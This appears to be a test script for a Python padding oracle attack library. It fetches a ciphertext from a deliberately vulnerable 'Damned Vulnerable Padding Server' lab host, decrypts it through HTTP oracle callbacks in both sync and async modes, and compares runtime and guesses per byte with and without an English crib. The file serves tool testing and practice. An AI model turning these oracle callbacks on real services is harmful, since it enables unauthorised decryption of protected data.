#!/usr/bin/env python3
from padlib import PadLibAsync, PadLibSync
import requests
import asyncio

import time

VERBOSE = True

# =================================================================================================

# simple callback function
# sends a suitably encoded request to the Damned Vulnerable Padding Server and returns True or False based on the result
# in a realistic scenario you may need to do more complex request creation and response parsing, retries, etc.

async def async_callback(guess, session):
    while True:
        try:
            async with session._session.get(f'http://www.kerberos.id:8080/decrypt-with-iv/{guess.hex()}') as r:
                return r.status == 200
        except:
            pass

# =================================================================================================

def callback(guess):
        r = requests.get(f'http://www.kerberos.id:8080/decrypt-with-iv/{guess.hex()}')
        return r.status_code == 200

# =================================================================================================

###################################################################################################
# async test
###################################################################################################

async def test_async_stuff(ciphertext):
    print('[+] Decrypting without crib...')
    t0_no_crib = time.time_ns()
    oracle = PadLibAsync(bytes.fromhex(ciphertext), async_callback, verbose=VERBOSE)
    result = await oracle.decrypt()
    t1_no_crib = time.time_ns()

    guesses_per_byte_no_crib = result['stats'] / len(result['plaintext'])
    print()

    print(result)

    ##########

    print('[+] Decrypting with crib...')
    t0_crib = time.time_ns()
    #crib_inst = crib_wrapper('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890 ')
    oracle = PadLibAsync(bytes.fromhex(ciphertext), async_callback, crib=PadLibAsync.CRIB_ENGLISH, verbose=VERBOSE)
    result = await oracle.decrypt()
    t1_crib = time.time_ns()

    print(result)
    guesses_per_byte_crib = result['stats'] / len(result['plaintext'])
    print()

    no_crib = t1_no_crib - t0_no_crib
    crib = t1_crib - t0_crib
    delta = crib / no_crib * 100
    print('>>> async stats <<<')
    print(f'[+] No crib took {no_crib / 1000000000:.1f} seconds')
    print(f'[+] With crib took {crib / 1000000000:.1f} seconds')
    print(f'[+] Crib took {delta:.1f}% of the time to decrypt vs without crib')
    print(f'[+] Guesses per byte:\n    Without crib = {guesses_per_byte_no_crib:.1f}\n    With crib    = {guesses_per_byte_crib:.1f}')
    print()

r = requests.get('http://www.kerberos.id:8080/encrypt-with-iv')
ciphertext = r.text

print(f'[+] Got ciphertext: {ciphertext}')

asyncio.run(test_async_stuff(ciphertext))

###################################################################################################
# sync test
###################################################################################################

def test_sync_stuff(ciphertext):
    print('[+] Decrypting without crib...')
    t0_no_crib = time.time_ns()
    oracle = PadLibSync(bytes.fromhex(ciphertext), callback, verbose=VERBOSE)
    result = oracle.decrypt()
    t1_no_crib = time.time_ns()

    guesses_per_byte_no_crib = result['stats'] / len(result['plaintext'])
    print()

    print(result)

    ##########

    print('[+] Decrypting with crib...')
    t0_crib = time.time_ns()
    #crib_inst = crib_wrapper('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890 ')
    oracle = PadLibSync(bytes.fromhex(ciphertext), callback, crib=PadLibSync.CRIB_ENGLISH, verbose=VERBOSE)
    result = oracle.decrypt()
    t1_crib = time.time_ns()

    print(result)
    guesses_per_byte_crib = result['stats'] / len(result['plaintext'])
    print()

    no_crib = t1_no_crib - t0_no_crib
    crib = t1_crib - t0_crib
    delta = crib / no_crib * 100
    print('>>> sync stats <<<')
    print(f'[+] No crib took {no_crib / 1000000000:.1f} seconds')
    print(f'[+] With crib took {crib / 1000000000:.1f} seconds')
    print(f'[+] Crib took {delta:.1f}% of the time to decrypt vs without crib')
    print(f'[+] Guesses per byte:\n    Without crib = {guesses_per_byte_no_crib:.1f}\n    With crib    = {guesses_per_byte_crib:.1f}')
    print()

test_sync_stuff(ciphertext)



"""



#print('[+] Encrypting message: a test message!')
#oracle = PadLib(bytes.fromhex(ciphertext), callback(), verbose=VERBOSE)
#result = oracle.encrypt('a test message!')
#print(result)
"""
